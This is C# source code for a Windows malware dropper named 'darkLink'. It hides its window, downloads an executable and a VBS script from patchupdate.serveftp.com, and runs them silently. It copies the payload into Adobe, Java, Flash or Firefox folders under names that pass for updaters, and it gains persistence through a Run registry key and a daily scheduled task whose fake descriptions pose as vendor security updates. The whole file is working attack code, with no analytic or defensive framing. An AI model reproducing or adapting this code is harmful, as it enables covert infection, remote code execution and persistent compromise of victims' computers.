using System;
using System.IO;
using System.Net.NetworkInformation;
using System.Net;
using System.Collections.Generic;
using System.ComponentModel;
using Microsoft.Win32;  
using System.Data;
using System.Drawing;
using System.Linq;
using System.Diagnostics;
using Microsoft.Win32.TaskScheduler;
using System.Text;
using System.Windows.Forms;

namespace darkLink
{
    public partial class Form1 : Form
    {
        private string sample = "";
        private string filename = "";        
        public static Boolean stopper = false;

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            //I ensured this was going to hide by changing the "Shown" event to run this funtion first.
            this.Hide();

            while (stopper == false)
            {
                    RunServer();
                    System.Threading.Thread.Sleep(5000); //Wait 5 seconds 
                    //then try again. I can change this to be longer if I want to.
            }
            Application.ExitThread();
            
        }

        private void RunServer()
        {
            try
            {
                //MessageBox.Show(Path.GetTempPath());
                if (CheckForInternetConnection())
                {
                    downloadFile();
                    checkFolders();
                    taskSchedule();
                    if (OSDetection() == "xp")
                    {
                        registryEdit();
                    }                    
                    Process.Start(sample);
                    stopper = true;                    
                }
                
            }
            catch (Exception err) { 
                return; 
            } //if no Client don't 
            //continue 
        }

        public static bool CheckForInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                using (var stream = client.OpenRead("http://www.google.com"))
                {
                    return true;
                }
            }
            catch
            {
                return false;
            }
        }

        public void downloadFile()
        {
            if (!File.Exists(Path.GetTempPath() + "updater.exe"))
                {
                var webClient = new WebClient();
                webClient.DownloadFile("http://patchupdate.serveftp.com/updater.exe", Path.GetTempPath() + "updater.exe");
                sample = Path.GetTempPath() + "updater.exe";
                }
        }

        public void checkFolders()
        {
            var sourceFileName = Path.GetTempPath() + "updater.exe";

            if (OSDetection() == "xp")
            {
                if (Directory.Exists("C:\\Program Files (x86)\\Adobe\\Reader 10.0\\Reader"))
                {
                    if (!File.Exists("C:\\Program Files (x86)\\Adobe\\Reader 10.0\\Reader\\AdobeUpdater.exe"))
                    {
                        File.Move(sourceFileName, "C:\\Program Files (x86)\\Adobe\\Reader 10.0\\Reader\\AdobeUpdater.exe");
                        sample = "C:\\Program Files (x86)\\Adobe\\Reader 10.0\\Reader\\AdobeUpdater.exe";
                    }
                    sample = "C:\\Program Files (x86)\\Adobe\\Reader 10.0\\Reader\\AdobeUpdater.exe";
                }
                else if (Directory.Exists("C:\\Program Files (x86)\\Adobe\\Reader 11.0\\Reader"))
                {
                    if (!File.Exists("C:\\Program Files (x86)\\Adobe\\Reader 11.0\\Reader\\AdobeUpdater.exe"))
                    {
                        File.Move(sourceFileName, "C:\\Program Files (x86)\\Adobe\\Reader 11.0\\Reader\\AdobeUpdater.exe");
                        sample = "C:\\Program Files (x86)\\Adobe\\Reader 11.0\\Reader\\AdobeUpdater.exe";
                    }
                    sample = "C:\\Program Files (x86)\\Adobe\\Reader 11.0\\Reader\\AdobeUpdater.exe";
                }
                else if (Directory.Exists("C:\\Program Files (x86)\\Adobe\\Flash Player"))
                {
                    if (!File.Exists("C:\\Program Files (x86)\\Adobe\\Flash Player\\FlashUpdater.exe"))
                    {
                        File.Move(sourceFileName, "C:\\Program Files (x86)\\Adobe\\Flash Player\\FlashUpdater.exe");
                        sample = "C:\\Program Files (x86)\\Adobe\\Flash Player\\FlashUpdater.exe";
                    }
                    sample = "C:\\Program Files (x86)\\Adobe\\Flash Player\\FlashUpdater.exe";
                }

                else if (Directory.Exists("C:\\Program Files (x86)\\Java\\jre6\\bin"))
                {
                    if (!File.Exists("C:\\Program Files (x86)\\Java\\jre6\\bin\\JavaUpdater.exe"))
                    {
                        File.Move(sourceFileName, "C:\\Program Files (x86)\\Java\\jre6\\bin\\JavaUpdater.exe");
                        sample = "C:\\Program Files (x86)\\Java\\jre6\\bin\\JavaUpdater.exe";
                    }
                    sample = "C:\\Program Files (x86)\\Java\\jre6\\bin\\JavaUpdater.exe";
                }

                else if (Directory.Exists("C:\\Program Files (x86)\\Java\\jre7\\bin"))
                {
                    if (!File.Exists("C:\\Program Files (x86)\\Java\\jre7\\bin\\JavaUpdater.exe"))
                    {
                        File.Move(sourceFileName, "C:\\Program Files (x86)\\Java\\jre7\\bin\\JavaUpdater.exe");
                        sample = "C:\\Program Files (x86)\\Java\\jre7\\bin\\JavaUpdater.exe";
                    }
                    sample = "C:\\Program Files (x86)\\Java\\jre7\\bin\\JavaUpdater.exe";
                }

                else if (Directory.Exists("C:\\Program Files\\Java\\jre7\\bin"))
                {
                    if (!File.Exists("C:\\Program Files\\Java\\jre7\\bin\\JavaUpdater.exe"))
                    {
                        File.Move(sourceFileName, "C:\\Program Files\\Java\\jre7\\bin\\JavaUpdater.exe");
                        sample = "C:\\Program Files\\Java\\jre7\\bin\\JavaUpdater.exe";
                    }
                    sample = "C:\\Program Files\\Java\\jre7\\bin\\JavaUpdater.exe";
                }
                else if (Directory.Exists("C:\\Program Files\\Java\\jre6\\bin"))
                {
                    if (!File.Exists("C:\\Program Files\\Java\\jre6\\bin\\JavaUpdater.exe"))
                    {
                        File.Move(sourceFileName, "C:\\Program Files\\Java\\jre6\\bin\\JavaUpdater.exe");
                        sample = "C:\\Program Files\\Java\\jre6\\bin\\JavaUpdater.exe";
                    }
                    sample = "C:\\Program Files\\Java\\jre6\\bin\\JavaUpdater.exe";
                }
                else if (Directory.Exists("C:\\Program Files\\Adobe\\Reader 10.0\\Reader"))
                {
                    if (!File.Exists("C:\\Program Files\\Adobe\\Reader 10.0\\Reader\\AdobeUpdater.exe"))
                    {
                        File.Move(sourceFileName, "C:\\Program Files\\Adobe\\Reader 10.0\\Reader\\AdobeUpdater.exe");
                        sample = "C:\\Program Files\\Adobe\\Reader 10.0\\Reader\\AdobeUpdater.exe";
                    }
                    sample = "C:\\Program Files\\Adobe\\Reader 10.0\\Reader\\AdobeUpdater.exe";
                }
                else if (Directory.Exists("C:\\Program Files\\Adobe\\Reader 11.0\\Reader"))
                {
                    if (!File.Exists("C:\\Program Files\\Adobe\\Reader 11.0\\Reader\\AdobeUpdater.exe"))
                    {
                        File.Move(sourceFileName, "C:\\Program Files\\Adobe\\Reader 11.0\\Reader\\AdobeUpdater.exe");
                        sample = "C:\\Program Files\\Adobe\\Reader 11.0\\Reader\\AdobeUpdater.exe";
                    }
                    sample = "C:\\Program Files\\Adobe\\Reader 11.0\\Reader\\AdobeUpdater.exe";
                }
                else if (Directory.Exists("C:\\Program Files\\Adobe\\Flash Player"))
                {
                    if (!File.Exists("C:\\Program Files\\Adobe\\Flash Player\\FlashUpdater.exe"))
                    {
                        File.Move(sourceFileName, "C:\\Program Files\\Adobe\\Flash Player\\FlashUpdater.exe");
                        sample = "C:\\Program Files\\Adobe\\Flash Player\\FlashUpdater.exe";
                    }
                    sample = "C:\\Program Files\\Adobe\\Flash Player\\FlashUpdater.exe";
                }
                else if (Directory.Exists("C:\\Program Files\\Mozilla Firefox"))
                {
                    if (!File.Exists("C:\\Program Files\\Mozilla Firefox\\FireFoxUpdater.exe"))
                    {
                        File.Move(sourceFileName, "C:\\Program Files\\Mozilla Firefox\\FireFoxUpdater.exe");
                        sample = "C:\\Program Files\\Mozilla Firefox\\FireFoxUpdater.exe";
                    }
                    sample = "C:\\Program Files\\Mozilla Firefox\\FireFoxUpdater.exe";
                }
                else if (Directory.Exists("C:\\Program Files (x86)\\Mozilla Firefox"))
                {
                    if (!File.Exists("C:\\Program Files (x86)\\Mozilla Firefox\\FireFoxUpdater.exe"))
                    {
                        File.Move(sourceFileName, "C:\\Program Files (x86)\\Mozilla Firefox\\FireFoxUpdater.exe");
                        sample = "C:\\Program Files (x86)\\Mozilla Firefox\\FireFoxUpdater.exe";
                    }
                    sample = "C:\\Program Files (x86)\\Mozilla Firefox\\FireFoxUpdater.exe";
                }
                else
                {
                    if (Directory.Exists("C:\\Program Files (x86)"))
                    {
                        if (!File.Exists("C:\\Program Files (x86)\\Adobe\\AdobeUpdater.exe"))
                        {
                            Directory.CreateDirectory("C:\\Program Files (x86)\\Adobe");
                            File.Move(sourceFileName, "C:\\Program Files (x86)\\Adobe\\AdobeUpdater.exe");
                            sample = "C:\\Program Files (x86)\\Adobe\\AdobeUpdater.exe";
                        }
                        sample = "C:\\Program Files (x86)\\Adobe\\AdobeUpdater.exe";
                    }
                    else
                    {
                        if (!File.Exists("C:\\Program Files\\Adobe\\AdobeUpdater.exe"))
                        {
                            Directory.CreateDirectory("C:\\Program Files\\Adobe");
                            File.Move(sourceFileName, "C:\\Program Files\\Adobe\\AdobeUpdater.exe");
                            sample = "C:\\Program Files\\Adobe\\AdobeUpdater.exe";
                        }
                        sample = "C:\\Program Files\\Adobe\\AdobeUpdater.exe";
                    }
                }
            }
                //it's windows 7. We have issues writing to those directories. So we download our friendly vbs script that will make it persistent.
            else
            {
                //This is where we can download the vbs file and execute it then delete it after execution.
                var webClient = new WebClient();
                webClient.DownloadFile("http://patchupdate.serveftp.com/downloader.vbs", Path.GetTempPath() + "downloader.vbs");
                //System.Diagnostics.Process.Start(@"cscript //B //Nologo " + Path.GetTempPath() + "downloader.vbs");
                Process scriptProc = new Process();
                scriptProc.StartInfo.FileName = @"cscript"; 
                scriptProc.StartInfo.Arguments ="//B //Nologo " + Path.GetTempPath() + "downloader.vbs";
                scriptProc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden; //prevent console window from popping up
                scriptProc.Start();
                scriptProc.WaitForExit();
                scriptProc.Close();

                System.Threading.Thread.Sleep(10000); //Wait 10 seconds
                File.Delete(Path.GetTempPath() + "downloader.vbs"); //Then delete the vbs script.

                sample = Path.GetTempPath() + "updater.exe";
                            
            }
            
        }

        public void registryEdit()
        {            
            //RegistryKey myReg = Registry.CurrentUser.OpenSubKey("test", true);
            RegistryKey myreg = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            filename = System.IO.Path.GetFileName(sample);

            if (filename == "AdobeUpdater.exe")
            {
                myreg.SetValue("Adobe Reader Updater", sample);
            }
            else if (filename == "FireFoxUpdater.exe")
            {
                myreg.SetValue("FireFox Updater", sample);
            }
            else if (filename == "FlashUpdater.exe")
            {
                myreg.SetValue("Flash Updater", sample);
            }
            else if (filename == "JavaUpdater.exe")
            {
                myreg.SetValue("Java Updater", sample);
            }
            else if (filename == "updater.exe")
            {
                myreg.SetValue("Windows Update", sample);
            }
            
            myreg.Close();     

        }

        public void taskSchedule()
        {
            try
            {
                string title = "";
                string description = "";
                filename = System.IO.Path.GetFileName(sample);
                if (filename == "AdobeUpdater.exe")
                {
                    title = "Adobe Reader Update";
                    description = "This task keeps your Adobe Reader installation up to date with the latest enhancements" +
                    " and security fixes. If this task is disabled or removed, Adobe Reader will be unable to automatically secure your machine with the latest security fixes.";
                }
                else if (filename == "FireFoxUpdater.exe")
                {
                    title = "FireFox Update";
                    description = "This task keeps your FireFox installation up to date with the latest enhancements" +
                    " and security fixes. If this task is disabled or removed, FireFox will be unable to automatically secure your machine with the latest security fixes.";
                }
                else if (filename == "FlashUpdater.exe")
                {
                    title = "Adobe Flash Player Update";
                    description = "This task keeps your Adobe Flash Player installation up to date with the latest enhancements" +
                    " and security fixes. If this task is disabled or removed, Adobe Flash Player will be unable to automatically secure your machine with the latest security fixes.";
                }
                else if (filename == "JavaUpdater.exe")
                {
                    title = "Java Update";
                    description = "This task keeps your Java installation up to date with the latest enhancements" +
                    " and security fixes. If this task is disabled or removed, Java will be unable to automatically secure your machine with the latest security fixes.";
                }
                else if (filename == "updater.exe")
                {
                    title = "windows Update";
                    description = "This task keeps your system up to date with the latest enhancements" +
                    " and security fixes. If this task is disabled or removed, your system will be unable to automatically secure your machine with the latest security fixes.";
                }


                // Get the service on the local machine
                using (TaskService ts = new TaskService())
                {
                    // Create a new task definition and assign properties
                    TaskDefinition td = ts.NewTask();
                    td.RegistrationInfo.Description = description;

                    // Create a trigger that will fire the task at this time every other day
                    td.Triggers.Add(new DailyTrigger(1));

                    // Create an action that will launch Notepad whenever the trigger fires
                    td.Actions.Add(new ExecAction(sample, null, null));

                    // Register the task in the root folder
                    ts.RootFolder.RegisterTaskDefinition(@title, td);

                    // Remove the task we just created
                    //ts.RootFolder.DeleteTask("Test");
                }
            }
            catch (Exception err)
            {
                throw(err);
            }
        }

        static string OSDetection()
        {
            string osVer = System.Environment.OSVersion.Version.ToString();
            string os = "";

            if (osVer.StartsWith("5")) // windows 2000, xp win2k3
            {
                os = "xp";
            }
            else // windows vista and windows 7 start with 6 in the version #
            {
                os = "w7";
            }
            return os;
        }
            
    }
}
//Process.Start(Path.GetTempPath() + "jLoader.jar");